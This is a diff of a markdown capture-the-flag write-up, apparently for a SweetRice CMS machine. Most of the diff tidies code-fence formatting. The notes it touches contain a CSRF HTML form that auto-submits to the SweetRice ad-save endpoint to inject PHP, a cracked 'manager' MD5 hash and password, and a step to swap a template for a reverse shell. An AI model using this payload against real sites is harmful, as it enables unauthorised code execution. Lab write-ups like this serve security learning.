@@ -33,8 +33,8 @@ draft: false
 - exploited and found backup sql database
 - admin account
 
-````
-user<html>
+```html
+<html>
 <body onload="document.exploit.submit();">
 <form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
 <input type="hidden" name="adk" value="hacked"/>
@@ -45,11 +45,11 @@ phpinfo();?>
 &lt;/textarea&gt;
 </form>
 </body>
-</html>```
+</html>
+```
+
 - name: manager
-    -password: 42f749ade7f9e195bf475f37a44cafcb
-        - hashid: md5
-        - password is= Password123
+  -password: 42f749ade7f9e195bf475f37a44cafcb - hashid: md5 - password is= Password123
 
 - change main.php template to reverse shell
 
@@ -58,7 +58,7 @@ phpinfo();?>
 ```bash
 22
 80
-````
+```
 
 ### Users:Passwords
 
